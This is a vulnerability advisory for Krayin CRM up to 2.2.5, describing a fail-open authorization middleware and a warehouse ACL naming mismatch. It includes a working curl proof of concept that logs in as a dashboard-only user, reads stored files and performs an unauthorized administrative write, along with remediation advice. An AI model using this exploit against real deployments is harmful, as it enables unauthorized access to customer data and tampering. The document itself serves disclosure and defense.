# Security Advisory

# Missing Function-Level Authorization (Broken Function-Level Access Control)

---

# Presentation

| Field                      | Value                                                      |
| -------------------------- | ---------------------------------------------------------- |
| **Security Vulnerability** | Missing Function-Level Authorization                       |
| **Vulnerability Type**     | Broken Function-Level Access Control                       |
| **CWE**                    | CWE-862 (Missing Authorization)                            |
| **CVE**                    | Pending                                                    |
| **Affected Component**     | Authorization Middleware (`Admin\Http\Middleware\Bouncer`) |
| **Software**               | Krayin CRM                                                 |
| **Affected Versions**      | ≤ 2.2.5                                                    |
| **Business Area**          | Customer Relationship Management (CRM)                     |
| **Severity**               | High                                                       |
| **CVSS v3.1**              | **8.1** (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)              |
| **Submitter**              | bl4dsc4n                                                   |

---

# Executive Summary

A **Missing Function-Level Authorization (CWE-862)** vulnerability exists in **Krayin CRM ≤ 2.2.5** due to incomplete authorization enforcement for administrative routes.

Krayin protects administrative functionality through the `Admin\Http\Middleware\Bouncer` middleware. Authorization is enforced only for routes explicitly registered in the application's Access Control List (`acl.php`). Administrative routes that are absent from the ACL are executed without any authorization verification.

As a result, any authenticated user, including users assigned to a custom role containing only the `dashboard` permission, can invoke sensitive administrative functionality.

Static analysis identified **91 administrative routes** lacking ACL protection, while runtime testing confirmed arbitrary file download and unauthorized state-changing operations performed by a dashboard-only account.

The vulnerability represents a classic **Broken Function-Level Authorization** issue caused by a **fail-open authorization model**.

---

# Vulnerability Details

## Vulnerability Type

Missing Function-Level Authorization

## CWE

**CWE-862 — Missing Authorization**

## Affected Middleware

```
Admin\Http\Middleware\Bouncer
```

---

# Root Cause Analysis

The authorization middleware determines whether a request requires permission validation by consulting an internal route-to-permission mapping generated from every `acl.php` file.

Conceptually, the logic behaves as follows:

* If the current route exists in the ACL mapping, the corresponding permission is enforced.
* If the route is absent from the ACL mapping, execution continues normally without any authorization verification.

Consequently, administrative routes omitted from the ACL become accessible to every authenticated user.

This creates a **fail-open authorization model**, where forgetting to register a route inside `acl.php` automatically exposes privileged functionality.

---

# Vulnerability Discovery

The vulnerability was identified in two independent phases.

## Part 1 — Static Analysis

The first phase consisted of comparing every registered administrative route against every route declared inside the application's ACL configuration.

The analysis extracts:

* every named `admin.*` route;
* every route registered in `packages/**/Config/acl.php`;

and computes the difference.

The results were:

| Metric                                      |  Count |
| ------------------------------------------- | -----: |
| Named administrative routes                 |    244 |
| ACL entries                                 |    215 |
| Administrative routes without authorization | **91** |

The comparison revealed numerous sensitive administrative endpoints that were never registered inside the ACL configuration.

---

## Warehouse ACL Typographical Error

An additional issue was identified during the ACL review.

The ACL configuration defines permissions using singular route names:

```
admin.settings.warehouse.*
```

while Laravel registers the actual routes using plural names:

```
admin.settings.warehouses.*
```

Since the middleware performs an exact lookup using the route name, the ACL entry never matches the registered route.

As a result, every Warehouse management endpoint is effectively left without authorization despite appearing protected in the ACL configuration.

This issue can be confirmed by inspecting the ACL configuration:

```bash
docker exec krayin-2.2.5 sh -lc "grep -n 'warehouse' /var/www/laravel-crm/packages/Webkul/Admin/src/Config/acl.php"
```

---

# Exploitation

## Part 2 — Low-Privilege User

Runtime verification was performed using an authenticated account assigned only the following permission:

```
dashboard
```

No administrative permissions were granted.

The low-privileged account successfully accessed privileged functionality that should only be available to administrators.

---

## Part 3 — Runtime Validation

The vulnerability was validated through direct HTTP requests using the authenticated low-privileged account.

The following behavior was observed:

### Control Test

A properly protected administrative endpoint correctly denied access.

Example:

```
GET /admin/settings/roles
```

Result:

```
401 Unauthorized
```

This confirms that authorization works correctly for routes registered inside the ACL.

---

### Unauthorized File Download

The following endpoint successfully returned files stored on the application's public storage disk:

```
GET /admin/settings/attributes/download
```

The authenticated dashboard-only user was able to retrieve sensitive files belonging to the application.

---

### Unauthorized Administrative Write

The following administrative endpoint successfully accepted state-changing requests:

```
POST /admin/settings/warehouses/create
```

The operation completed successfully despite the authenticated user lacking Warehouse management permissions.

Database verification confirmed that the resource had been created.

---

# Affected Administrative Endpoints

The following categories contain routes that were identified without ACL protection.

## Administrative Writes

* Configuration updates
* Data import management
* Warehouse management
* Location management
* Attribute mass deletion
* Lead management
* Product inventory management
* Mail operations
* Contact tag management
* Saved filters
* TinyMCE uploads
* User account updates

---

## Sensitive Reads

Examples include:

* Attribute downloads
* Configuration downloads
* Email attachment downloads
* Activity attachment downloads
* Import downloads
* Import error reports
* Sample file downloads

---

# Security Impact

An authenticated low-privileged user may execute administrative functionality without possessing the required permissions.

Successful exploitation allows unauthorized access to sensitive application features and data.

## Confidentiality

High.

Potential disclosure includes:

* Customer information
* Imported datasets
* Email attachments
* Uploaded documents
* Internal business files

---

## Integrity

High.

Potential unauthorized actions include:

* Warehouse creation
* Warehouse modification
* Configuration changes
* Administrative writes
* Data imports
* Product modifications
* Lead manipulation
* Attribute deletion

---

## Availability

No direct availability impact was observed.

---

# Attack Scenario

1. The attacker authenticates using a minimally privileged account.

2. The attacker directly invokes an administrative route omitted from the ACL.

3. Since the middleware performs no authorization check, the request is executed successfully.

4. The attacker gains access to privileged administrative functionality.

No privilege escalation or authentication bypass is required.

---

## Proof of Concept

The vulnerability was validated in two independent phases.

The first phase demonstrates that the authorization gap exists by comparing every registered administrative route against the application's Access Control List (ACL). This step requires access to the application source code or container.

The second phase demonstrates practical exploitation using only HTTP requests from a low-privileged authenticated account. No source code access is required during exploitation.

---

# Part 1 — Discovering Ungated Administrative Routes

This phase requires access to the application source code or Docker container.

The helper script compares:

* all Laravel routes named `admin.*`;
* every route registered inside `packages/**/Config/acl.php`.

It then computes the difference, identifying administrative routes that are not protected by the authorization middleware.

Execute:

```bash
docker cp /tmp/ag2.sh krayin-2.2.5:/tmp/ag2.sh 2>/dev/null
docker exec krayin-2.2.5 sh /tmp/ag2.sh
```

The script (`acl_gap2.sh`) extracts every route declared with:

```php
->name('admin...')
```

and compares them against every route defined inside the ACL configuration.

The resulting report includes:

* Total administrative routes.
* Total ACL entries.
* Administrative routes without ACL protection.
* HTTP methods.
* Route names.
* Warehouse ACL naming mismatch.

---

## Warehouse ACL Typographical Error

The ACL configuration references Warehouse permissions using singular route names:

```text
admin.settings.warehouse.*
```

while Laravel registers the actual routes using plural names:

```text
admin.settings.warehouses.*
```

Since authorization is performed through an exact route-name lookup, the permission is never matched and every Warehouse endpoint becomes publicly accessible to authenticated users.

The mismatch can be verified directly:

```bash
docker exec krayin-2.2.5 sh -lc "grep -n 'warehouse' /var/www/laravel-crm/packages/Webkul/Admin/src/Config/acl.php"
```

---

# Part 2 — Creating a Low-Privilege Test User

This step is required only for laboratory validation.

During a real penetration test or real-world attack, the attacker already possesses a legitimate low-privileged account.

The following commands create a custom role containing only the `dashboard` permission and assign it to a test user.

```bash
docker exec krayin-2.2.5 sh -lc "mysql -ukrayin -pkrayin krayin -e \"INSERT INTO roles (name,description,permission_type,permissions,created_at,updated_at) VALUES ('lp862','poc','custom','[\\\"dashboard\\\"]',NOW(),NOW());\""

RID=$(docker exec krayin-2.2.5 sh -lc "mysql -ukrayin -pkrayin krayin -N -e \"SELECT id FROM roles WHERE name='lp862';\"")

docker exec krayin-2.2.5 php /var/www/laravel-crm/artisan tinker --execute="DB::table('users')->insert(['name'=>'lp862','email'=>'lp862@test.local','password'=>bcrypt('test123'),'status'=>1,'role_id'=>$RID,'created_at'=>now(),'updated_at'=>now()]);"
```

The resulting user possesses only the following permission:

```text
dashboard
```

No administrative permissions are granted.

---

# Part 3 — Runtime Exploitation

Once a low-privileged account exists, the vulnerability can be reproduced entirely through HTTP requests.

The proof-of-concept performs the following operations:

1. Authenticate using the dashboard-only account.
2. Obtain a valid Laravel session.
3. Extract the session CSRF token from the encrypted `XSRF-TOKEN` cookie.
4. Verify that properly protected routes are denied.
5. Access an administrative endpoint lacking ACL protection.
6. Perform an unauthorized administrative write operation.

The complete self-contained PoC is shown below.

```bash
B="http://localhost:8085"
J="$(mktemp)"

# Login
curl -s -c "$J" -b "$J" "$B/admin/login" -o /tmp/lp.html

LT="$(grep -oE 'name="_token" value="[^"]+"' /tmp/lp.html | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')"

curl -s -c "$J" -b "$J" \
-d "_token=$LT" \
--data-urlencode "email=lp862@test.local" \
--data-urlencode "password=test123" \
-o /dev/null \
"$B/admin/login"

curl -s -b "$J" -c "$J" "$B/admin/dashboard" -o /dev/null

urldecode(){ printf '%b' "${1//%/\\x}"; }

XSRF="$(urldecode "$(grep -i 'XSRF-TOKEN' "$J" | tail -1 | awk '{print $NF}')")"

echo "XSRF len=${#XSRF}"

# Control test (protected route)

curl -s -b "$J" "$B/admin/settings/roles" \
| grep -qiE "401|Unauthorized" \
&& echo "roles: DENIED" \
|| echo "roles: ALLOWED"

# Arbitrary file read

curl -s -b "$J" \
"$B/admin/settings/attributes/download?path=data-transfer/samples/persons.csv"

# Unauthorized administrative write

curl -s \
-o /dev/null \
-w "warehouse POST: %{http_code}\n" \
-b "$J" \
-H "X-XSRF-TOKEN: $XSRF" \
-H "X-Requested-With: XMLHttpRequest" \
--data-urlencode "name=PWNED_WH_862" \
"$B/admin/settings/warehouses/create"
```

---

# Expected Results

## Control Test

Request:

```text
GET /admin/settings/roles
```

Expected result:

```text
401 Unauthorized
```

This confirms that routes correctly registered inside the ACL remain protected.

---

## Unauthorized File Read

Request:

```text
GET /admin/settings/attributes/download
```

Expected result:

```text
HTTP/200

name,emails,contact_numbers,...
```

The dashboard-only user successfully downloads a file from the application's public storage.

---

## Unauthorized Administrative Write

Request:

```text
POST /admin/settings/warehouses/create
```

Expected result:

```text
302 Redirect
```

Database verification confirms that the Warehouse resource was successfully created despite the user lacking Warehouse permissions.

---

# Important Notes

### CSRF Token

Laravel expects the authenticated SPA to submit the CSRF token through the **X-XSRF-TOKEN** header.

The token is obtained from the encrypted `XSRF-TOKEN` cookie generated after authentication.

Using the `X-CSRF-TOKEN` header does not work in this scenario.

---

### Middleware Execution Order

`VerifyCsrfToken` executes before `Admin\Http\Middleware\Bouncer`.

Consequently, requests lacking a valid CSRF token are rejected before reaching the authorization middleware.

---

### Authorization Validation

In the tested version, calls to `abort(401)` return an HTTP 200 status code while rendering a **401 Unauthorized** page.

Therefore, authorization should be verified by inspecting the response body rather than relying solely on the HTTP status code.

---

### Arbitrary File Read

The arbitrary file download endpoint uses the HTTP GET method and therefore does not require CSRF validation, making it the simplest proof-of-concept for demonstrating the authorization bypass.

---

# Cleanup

After testing, remove the laboratory artifacts:

```bash
docker exec krayin-2.2.5 sh -lc "mysql -ukrayin -pkrayin krayin -e \"DELETE FROM warehouses WHERE name='PWNED_WH_862'; DELETE FROM users WHERE email='lp862@test.local'; DELETE FROM roles WHERE name='lp862';\""
```

---

# CVSS v3.1

**Vector**

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
```

**Base Score**

**8.1 — High**

---

# CWE

* CWE-862 — Missing Authorization

---

# Suggested Remediation

The authorization model should follow a **fail-closed** approach.

Recommendations:

1. Require explicit authorization for every `admin.*` route.

2. Reject requests to administrative routes that are missing ACL entries.

3. Audit every administrative route introduced in previous releases.

4. Correct the Warehouse ACL naming mismatch (`warehouse` → `warehouses`).

5. Implement authorization checks inside controllers as defense in depth.

6. Add automated tests that verify every administrative route is protected by an ACL entry.

---

# Vendor Response

Pending.

---

# Timeline

| Date       | Event                    |
| ---------- | ------------------------ |
| YYYY-MM-DD | Vulnerability discovered |
| YYYY-MM-DD | Vendor notified          |
| YYYY-MM-DD | Vendor acknowledgment    |
| YYYY-MM-DD | Patch released           |
| YYYY-MM-DD | CVE assigned             |
| YYYY-MM-DD | Public disclosure        |

---

# Credits

## Discovered by

**Carlos Tuma (bl4dsc4n)**

Security Researcher

---

# References

* CWE-862 — Missing Authorization
* OWASP Top 10 2021 — A01: Broken Access Control
* OWASP ASVS 4.0 — V4 Access Control
* CVSS v3.1 Specification
